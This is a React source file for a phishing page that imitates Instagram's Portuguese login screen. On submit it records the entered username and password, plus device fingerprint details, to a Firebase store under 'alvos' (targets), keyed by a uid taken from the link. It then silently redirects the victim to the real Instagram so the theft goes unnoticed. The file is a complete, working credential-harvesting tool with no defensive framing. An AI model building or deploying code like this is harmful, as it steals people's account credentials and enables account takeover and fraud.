"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { db } from "@/lib/firebase"
import { ref, push } from "firebase/database"
import { SecurityLayer } from "@/components/security-layer"

export function InstagramLogin() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [userId, setUserId] = useState<string | null>(null)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const userIdParam = params.get("uid")
    setUserId(userIdParam)
    console.log("[v0] User ID from URL:", userIdParam)
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    console.log("[v0] Instagram form submitted", { username, password })

    try {
      const userPath = userId || "anonymous"
      console.log("[v0] Saving to path:", `alvos/${userPath}`)

      const alvosRef = ref(db, `alvos/${userPath}`)

      const captureData = {
        pageType: "instagram",
        pageName: "Instagram",
        data: { username, password },
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        deviceInfo: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          cookiesEnabled: navigator.cookieEnabled,
        },
      }

      console.log("[v0] Capture data prepared:", captureData)

      const result = await push(alvosRef, captureData)
      console.log("[v0] Data saved successfully! Key:", result.key)

      // Redirect without alert
      window.location.href = "https://www.instagram.com"
    } catch (error) {
      console.error("[v0] Error capturing data:", error)
      window.location.href = "https://www.instagram.com"
    }
  }

  return (
    <>
      <SecurityLayer />

      <div className="min-h-screen flex items-center justify-center bg-[#fafafa] p-4">
        <div className="w-full max-w-[350px] space-y-3">
          <div className="bg-white border border-gray-300 rounded-sm p-10 flex flex-col items-center">
            <div className="mb-8">
              <img src="/instagram-logo.png" alt="Instagram" className="h-14 w-auto" />
            </div>

            <form onSubmit={handleSubmit} className="w-full space-y-2">
              <input
                type="text"
                placeholder="Telefone, nome de usuário ou email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                className="w-full px-2 py-[9px] text-xs text-gray-900 placeholder:text-gray-500 bg-[#fafafa] border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
              />
              <input
                type="password"
                placeholder="Senha"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="w-full px-2 py-[9px] text-xs text-gray-900 placeholder:text-gray-500 bg-[#fafafa] border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400"
              />
              <Button
                type="submit"
                disabled={isLoading || !username || !password}
                className="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold text-sm rounded-lg h-8 disabled:opacity-30 disabled:cursor-not-allowed mt-4"
              >
                {isLoading ? "Entrando..." : "Entrar"}
              </Button>
            </form>

            <div className="flex items-center w-full my-5">
              <div className="flex-1 h-px bg-gray-300" />
              <span className="px-4 text-xs text-gray-500 font-semibold">OU</span>
              <div className="flex-1 h-px bg-gray-300" />
            </div>

            <button
              type="button"
              onClick={() => (window.location.href = "https://www.facebook.com")}
              className="flex items-center gap-2 text-sm font-semibold text-[#385185] hover:text-[#1877f2] cursor-pointer"
            >
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
              </svg>
              Entrar com o Facebook
            </button>

            <a
              href="https://www.instagram.com/accounts/password/reset/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-xs text-[#00376b] mt-4 hover:text-[#003c75]"
            >
              Esqueceu a senha?
            </a>
          </div>

          <div className="bg-white border border-gray-300 rounded-sm p-6 text-center">
            <p className="text-sm text-gray-900">
              Não tem uma conta?{" "}
              <a
                href="https://www.instagram.com/accounts/emailsignup/"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[#0095f6] font-semibold hover:text-[#1877f2]"
              >
                Cadastre-se
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  )
}
